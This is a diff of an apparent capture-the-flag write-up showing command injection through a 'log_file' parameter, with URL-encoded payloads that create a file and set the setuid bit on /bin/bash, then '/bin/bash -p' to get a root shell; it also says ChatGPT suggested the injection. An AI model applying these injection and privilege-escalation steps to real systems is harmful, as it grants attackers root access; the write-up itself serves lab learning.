@@ -150,22 +150,44 @@ tag: season 6
  __and open in my browser ```127.0.0.1:8888``` and access with same ssh data..__
 
  ![](/img/yyyy.png)
-after intercepting the request I found this parameter (log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log) which looks valuable I tried some command injection but nothing happened then I asked ChatGPT and it told me:
 
- I will try command injection. add a semicolon after [log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;]  then encode url the command "touch /home/amay/hulk.hack" =>> "%74%6f%75%63%68%20%2f%68%6f%6d%65%2f%61%6d%61%79%2f%68%75%6c%6b%2e%68%61%63%6b" 
+ after intercepting the request I found this parameter (log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log) which looks valuable I tried some command injection but nothing happened then I asked ChatGPT and it told me:
+
+ ![](/img/ssm1.png)
+
+ - Here. I will try the command injection is work; so i will make file .
+
+ I will try command injection. add a semicolon after [log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;]  then URL encoded this command "touch /home/amay/hulk.hack" =>>"%74%6f%75%63%68%20%2f%68%6f%6d%65%2f%61%6d%61%79%2f%68%75%6c%6b%2e%68%61%63%6b" 
 
  ![](/img/sert.png)
 
  ![](/img/tert.png)
 
- - __and it's WORK !!__
+ - __BOOM!..it's WORK !!__
  
- - then i try this command 
+ - then if i can do this command "chmod u+s /bin/bash" it will gain me a root shill.because
+
+
+         "u" stands for "user" (the owner of the file).
+
+         "+s" sets the setuid bit.
+
+         What Does setuid Do?
+
+         When the setuid bit is set on an executable file, it allows a user to run the executable with the permissions of the file's owner. In the case of /bin/bash, which is typically owned by the root user, this means that any user who runs /bin/bash would start a shell with root privileges.
+
+         and that what i do ..
+
+
  ```"chmod u+s /bin/bash" =>> "%63%68%6d%6f%64%20%20%75%2b%73%20%20%2f%62%69%6e%2f%62%61%73%68"```
 
  ![](/img/q33.png)
 
- * then go to ssh connection and type.
+ * then go to ssh connection and type. "/bin/bash -p"
+
+         The "-p" option in Bash stands for "privileged mode."
+       with "-p", Bash skips this step, allowing the shell to retain its higher privileges (usually the effective user ID).
+  
  > /bin/bash -p 
 
  ![](/img/root.png) 
